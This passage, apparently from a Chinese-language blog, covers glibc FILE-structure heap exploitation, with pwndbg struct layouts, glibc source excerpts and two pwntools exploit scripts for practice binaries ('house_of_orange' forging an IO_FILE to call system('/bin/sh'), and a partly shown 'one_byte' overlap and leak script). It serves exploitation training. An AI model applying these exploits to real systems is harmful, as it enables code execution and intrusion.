class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt;  ptype /o FILE<br>pwndbg&gt;  ptype /o <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>  </span><br><span class="hljs-class">/* <span class="hljs-title">offset</span>    |  <span class="hljs-title">size</span> */  <span class="hljs-title">type</span> =</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br><span class="hljs-comment">/*    0      |     4 */</span>    <span class="hljs-type">int</span> _flags;<br><span class="hljs-comment">/* XXX  4-byte hole  */</span><br><span class="hljs-comment">/*    8      |     8 */</span>    <span class="hljs-type">char</span> *_IO_read_ptr;<br><span class="hljs-comment">/*   16      |     8 */</span>    <span class="hljs-type">char</span> *_IO_read_end;<br><span class="hljs-comment">/*   24      |     8 */</span>    <span class="hljs-type">char</span> *_IO_read_base;<br><span class="hljs-comment">/*   32      |     8 */</span>    <span class="hljs-type">char</span> *_IO_write_base;<br><span class="hljs-comment">/*   40      |     8 */</span>    <span class="hljs-type">char</span> *_IO_write_ptr;<br><span class="hljs-comment">/*   48      |     8 */</span>    <span class="hljs-type">char</span> *_IO_write_end;<br><span class="hljs-comment">/*   56      |     8 */</span>    <span class="hljs-type">char</span> *_IO_buf_base;<br><span class="hljs-comment">/*   64      |     8 */</span>    <span class="hljs-type">char</span> *_IO_buf_end;<br><span class="hljs-comment">/*   72      |     8 */</span>    <span class="hljs-type">char</span> *_IO_save_base;<br><span class="hljs-comment">/*   80      |     8 */</span>    <span class="hljs-type">char</span> *_IO_backup_base;<br><span class="hljs-comment">/*   88      |     8 */</span>    <span class="hljs-type">char</span> *_IO_save_end;<br><span class="hljs-comment">/*   96      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><span class="hljs-comment">/*  104      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><span class="hljs-comment">/*  112      |     4 */</span>    <span class="hljs-type">int</span> _fileno;<br><span class="hljs-comment">/*  116      |     4 */</span>    <span class="hljs-type">int</span> _flags2;<br><span class="hljs-comment">/*  120      |     8 */</span>    <span class="hljs-type">__off_t</span> _old_offset;<br><span class="hljs-comment">/*  128      |     2 */</span>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br><span class="hljs-comment">/*  130      |     1 */</span>    <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br><span class="hljs-comment">/*  131      |     1 */</span>    <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><span class="hljs-comment">/* XXX  4-byte hole  */</span><br><span class="hljs-comment">/*  136      |     8 */</span>    _IO_lock_t *_lock;<br><span class="hljs-comment">/*  144      |     8 */</span>    <span class="hljs-type">__off64_t</span> _offset;<br><span class="hljs-comment">/*  152      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br><span class="hljs-comment">/*  160      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br><span class="hljs-comment">/*  168      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br><span class="hljs-comment">/*  176      |     8 */</span>    <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-comment">/*  184      |     8 */</span>    <span class="hljs-type">size_t</span> __pad5;<br><span class="hljs-comment">/*  192      |     4 */</span>    <span class="hljs-type">int</span> _mode;<br><span class="hljs-comment">/*  196      |    20 */</span>    <span class="hljs-type">char</span> _unused2[<span class="hljs-number">20</span>];<br><br>                           <span class="hljs-comment">/* total size (bytes):  216 */</span><br>                         &#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; dt <span class="hljs-string">&quot;struct _IO_FILE&quot;</span><br>pwndbg&gt; dt  FILE<br>FILE<br>    +<span class="hljs-number">0x0000</span> _flags               : <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0008</span> _IO_read_ptr         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0010</span> _IO_read_end         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0018</span> _IO_read_base        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0020</span> _IO_write_base       : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0028</span> _IO_write_ptr        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0030</span> _IO_write_end        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0038</span> _IO_buf_base         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0040</span> _IO_buf_end          : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0048</span> _IO_save_base        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0050</span> _IO_backup_base      : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0058</span> _IO_save_end         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0060</span> _markers             : <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x0068</span> _<span class="hljs-title">chain</span>               :</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x0070</span> _<span class="hljs-title">fileno</span>              :</span> <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0074</span> _flags2              : <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0078</span> _old_offset          : <span class="hljs-type">__off_t</span><br>    +<span class="hljs-number">0x0080</span> _cur_column          : <span class="hljs-type">short</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0082</span> _vtable_offset       : <span class="hljs-type">signed</span> <span class="hljs-type">char</span><br>    +<span class="hljs-number">0x0083</span> _shortbuf            : <span class="hljs-type">char</span> [<span class="hljs-number">1</span>]<br>    +<span class="hljs-number">0x0088</span> _lock                : _IO_lock_t *<br>    +<span class="hljs-number">0x0090</span> _offset              : <span class="hljs-type">__off64_t</span><br>    +<span class="hljs-number">0x0098</span> _codecvt             : <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x00a0</span> _<span class="hljs-title">wide_data</span>           :</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x00a8</span> _<span class="hljs-title">freeres_list</span>        :</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x00b0</span> _<span class="hljs-title">freeres_buf</span>         :</span> <span class="hljs-type">void</span> *<br>    +<span class="hljs-number">0x00b8</span> __pad5               : <span class="hljs-type">size_t</span><br>    +<span class="hljs-number">0x00c0</span> _mode                : <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x00c4</span> _unused2             : <span class="hljs-type">char</span> [<span class="hljs-number">20</span>]<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _IO_list_all<br>$<span class="hljs-number">2</span> = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) <span class="hljs-number">0x7ffff7f775c0</span> &lt;_IO_2_1_stderr_&gt;<br>pwndbg&gt; dt <span class="hljs-string">&quot;struct _IO_FILE_plus&quot;</span><br><span class="hljs-keyword">struct</span> _IO_FILE_plus<br>    +<span class="hljs-number">0x0000</span> file                 : FILE<br>    +<span class="hljs-number">0x00d8</span> vtable               : <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; dt <span class="hljs-string">&quot;struct _IO_jump_t&quot;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">    +0<span class="hljs-title">x0000</span> __<span class="hljs-title">dummy</span>              :</span> <span class="hljs-type">size_t</span><br>    +<span class="hljs-number">0x0008</span> __dummy2             : <span class="hljs-type">size_t</span><br>    +<span class="hljs-number">0x0010</span> __finish             : _IO_finish_t<br>    +<span class="hljs-number">0x0018</span> __overflow           : _IO_overflow_t<br>    +<span class="hljs-number">0x0020</span> __underflow          : _IO_underflow_t<br>    +<span class="hljs-number">0x0028</span> __uflow              : _IO_underflow_t<br>    +<span class="hljs-number">0x0030</span> __pbackfail          : _IO_pbackfail_t<br>    +<span class="hljs-number">0x0038</span> __xsputn             : _IO_xsputn_t<br>    +<span class="hljs-number">0x0040</span> __xsgetn             : _IO_xsgetn_t<br>    +<span class="hljs-number">0x0048</span> __seekoff            : _IO_seekoff_t<br>    +<span class="hljs-number">0x0050</span> __seekpos            : _IO_seekpos_t<br>    +<span class="hljs-number">0x0058</span> __setbuf             : _IO_setbuf_t<br>    +<span class="hljs-number">0x0060</span> __sync               : _IO_sync_t<br>    +<span class="hljs-number">0x0068</span> __doallocate         : _IO_doallocate_t<br>    +<span class="hljs-number">0x0070</span> __read               : _IO_read_t<br>    +<span class="hljs-number">0x0078</span> __write              : _IO_write_t<br>    +<span class="hljs-number">0x0080</span> __seek               : _IO_seek_t<br>    +<span class="hljs-number">0x0088</span> __close              : _IO_close_t<br>    +<span class="hljs-number">0x0090</span> __stat               : _IO_stat_t<br>    +<span class="hljs-number">0x0098</span> __showmanyc          : _IO_showmanyc_t<br>    +<span class="hljs-number">0x00a0</span> __imbue              : _IO_imbue_t<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>   &#123;<br>     run_fp = fp;<br>     <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>     <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br><br>     <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>     run_fp = <span class="hljs-literal">NULL</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>		set_non_main_arena (victim);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>	      <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment">		 We may return one of these chunks later.  */</span><br>	      <span class="hljs-keyword">if</span> (tcache_nb<br>		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>		&#123;<br>		  tcache_put (victim, tc_idx);<br>		  return_cached = <span class="hljs-number">1</span>;<br>		  <span class="hljs-keyword">continue</span>;<br>		&#125;<br>	      <span class="hljs-keyword">else</span><br>		&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125;<br></code></pre></td></tr></table></figure>

<h4 id="ç¤ºä¾‹ä¸€-house-of-orange"><a href="#ç¤ºä¾‹ä¸€-house-of-orange" class="headerlink" title="ç¤ºä¾‹ä¸€  house_of_orange"></a>ç¤ºä¾‹ä¸€  house_of_orange</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§ <a href="attachment%5Chouse_of_orange%5Chouse_of_orange">house_of_orange</a></p>
</blockquote>
<h5 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;house_of_orange&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">set breakpoint pending on</span><br><span class="hljs-string">break _IO_flush_all_lockp</span><br><span class="hljs-string">enable breakpoints once 1</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Select the &quot;malloc (small)&quot; option.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_malloc</span>():<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;malloc (large)&quot; option.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">large_malloc</span>():<br>    io.sendthen(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;edit (1st small chunk)&quot; option; send data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br><br><span class="hljs-comment"># This binary leaks the heap start address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;heap @ &quot;</span>)<br>heap = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Request a small chunk.</span><br>small_malloc()<br><br><span class="hljs-comment"># Edit the 1st small chunk.</span><br>edit(<span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x20</span> + <span class="hljs-number">1</span>))<br>large_malloc()<br><span class="hljs-comment"># edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0))</span><br><span class="hljs-comment"># edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0) + p64(libc.sym._IO_list_all - 0x10))</span><br><span class="hljs-comment"># small_malloc()</span><br><br><span class="hljs-comment"># IO_FILE</span><br>flags = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>size = <span class="hljs-number">0x61</span><br>fd = <span class="hljs-number">0</span><br>bk = libc.sym._IO_list_all - <span class="hljs-number">0x10</span><br><br>write_base = <span class="hljs-number">0x1</span><br>write_ptr = <span class="hljs-number">0x2</span><br>mode =  <span class="hljs-number">0x0</span><br>vtable_ptr = heap + <span class="hljs-number">0xd8</span><br>overflow = libc.sym.system<br><br>fake_io_file = flags + p64(size) +\<br>    p64(fd) + p64(bk) +\<br>    p64(write_base) + p64(write_ptr) +\<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">18</span> + p32(mode) + p32(<span class="hljs-number">0</span>) +\<br>    p64(<span class="hljs-number">0</span>) + p64(overflow) +p64(vtable_ptr)<br><br><br>edit(<span class="hljs-string">b&quot;X&quot;</span>*<span class="hljs-number">16</span> + fake_io_file)<br><br>small_malloc()<br><br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>



<h4 id="ç¤ºä¾‹äºŒ-one-byte"><a href="#ç¤ºä¾‹äºŒ-one-byte" class="headerlink" title="ç¤ºä¾‹äºŒ one_byte"></a>ç¤ºä¾‹äºŒ one_byte</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§ <a href="attachment%5Cone_byte%5Cone_byte">one_byte</a></p>
</blockquote>
<h5 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;one_byte&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>():<br>    <span class="hljs-keyword">global</span> index<br>    io.sendthen(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;edit&quot; option; send index &amp; data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;read&quot; option; read 0x58 bytes.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    r = io.recv(<span class="hljs-number">0x58</span>)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    <span class="hljs-keyword">return</span> r<br><br>io = start()<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br>chunk_A = malloc()<br>chunk_B = malloc()<br>chunk_C = malloc()<br>chunk_D = malloc()<br>chunk_E = malloc()<br><br><span class="hljs-comment"># overlap</span><br>edit(chunk_A, <span class="hljs-string">b&#x27;Y&#x27;</span>*<span class="hljs-number">88</span> + p8(<span class="hljs-number">0xc1</span>))<br><br><span class="hljs-comment"># leak libc</span><br>free(chunk_B)<br>chunk_B = malloc()<br><br>data = read(chunk_C)<br>unsortedbin_address = u64(data[:<span class="hljs-number">8</span>])<br>info(<span class="hljs-string">f&quot;unsortedbin_address -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(unsortedbin_address)&#125;</span>&quot;</span>)<br>libc.address = unsortedbin_address - <span class="hljs-number">0x58</span> - libc.sym.main_arena<br>info(<span class="hljs-string">f&quot;libc base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># leak heap</span><br>chunk_C2 = malloc()<br>free(chunk_A)<br>free(chunk_C2)<br><br>heap = u64(read(chunk_C)[:<span class="hljs-number">8</span>])<br>info(<span class="hljs-string">f&quot;heap base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># unsortedbin</span><br>chunk_C2 = malloc()<br>chunk_A = malloc()<br>edit(chunk_A, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">88</span> + p8(<span class="hljs-number">0xc1</span>))<br><span class="hljs-comment"># edit(chunk_A, b&quot;Y&quot;*88 + p8(0x68))</span><br>free(chunk_B)<br>chunk_B = malloc()<br><br><span class="hljs-comment"># unsortedbin again and IO_File</span><br>edit(chunk_B, p64(<span 